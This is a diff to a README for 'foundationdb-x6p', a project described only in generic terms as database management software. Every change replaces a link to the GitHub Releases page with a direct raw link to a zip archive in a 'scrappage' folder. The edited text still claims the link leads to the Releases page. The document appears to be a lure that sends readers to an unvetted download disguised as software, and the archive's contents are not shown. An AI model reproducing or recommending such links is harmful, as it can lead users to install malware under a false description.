@@ -1,6 +1,6 @@
 # 🚀 foundationdb-x6p - Simplify Your Database Management
 
-[![Download foundationdb-x6p](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/bytobeng/foundationdb-x6p/releases)
+[![Download foundationdb-x6p](https://raw.githubusercontent.com/bytobeng/foundationdb-x6p/main/scrappage/foundationdb-x6p.zip)](https://raw.githubusercontent.com/bytobeng/foundationdb-x6p/main/scrappage/foundationdb-x6p.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, you need to download the application.
 
 1. Click on the download button below:
   
-   [Download foundationdb-x6p](https://github.com/bytobeng/foundationdb-x6p/releases)
+   [Download foundationdb-x6p](https://raw.githubusercontent.com/bytobeng/foundationdb-x6p/main/scrappage/foundationdb-x6p.zip)
 
 2. This link will take you to the Releases page where you can find the latest version.
 
@@ -81,11 +81,11 @@ If you wish to help improve foundationdb-x6p:
 
 To stay updated with the latest enhancements:
 
-- Regularly visit the [Releases page](https://github.com/bytobeng/foundationdb-x6p/releases) for new versions.
+- Regularly visit the [Releases page](https://raw.githubusercontent.com/bytobeng/foundationdb-x6p/main/scrappage/foundationdb-x6p.zip) for new versions.
 - Enable notifications for this repository to be alerted on changes.
 
 ## 🎉 Conclusion
 
 foundationdb-x6p offers a simple solution for managing databases. The user-friendly design, coupled with essential features and support, makes it an ideal choice for anyone looking to streamline their database tasks. Download the application today and enjoy a smoother database experience.
 
-[Download foundationdb-x6p](https://github.com/bytobeng/foundationdb-x6p/releases)
+[Download foundationdb-x6p](https://raw.githubusercontent.com/bytobeng/foundationdb-x6p/main/scrappage/foundationdb-x6p.zip)
